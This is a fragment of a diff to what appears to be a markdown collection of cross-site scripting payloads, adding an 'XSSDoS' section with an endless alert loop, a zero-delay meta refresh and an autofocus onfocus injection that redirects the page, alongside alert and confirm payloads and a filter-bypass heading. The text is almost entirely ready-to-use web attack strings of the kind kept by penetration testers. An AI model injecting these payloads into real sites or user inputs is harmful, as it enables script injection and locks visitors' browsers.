@@ -118,6 +118,14 @@ onMouseOver=<script>alert("/XSS BY Y000!/")</script>
 
 `"><details/open/ontoggle=confirm`/xss_by_Y000!/`>`
 
+### XSSDoS
+
+```
+<script> for(;;) alert("_Y000!_")</script>
+<meta%20http-equiv="refresh"%20content="0;">
+"  autofocus '-->--!><Input/Autofocus/*/Onfocus=document.location=``;alert`_Y000!_`//>
+```
+
 ### Filter Bypass Alert Obfuscation
  ```
 (alert)(1)
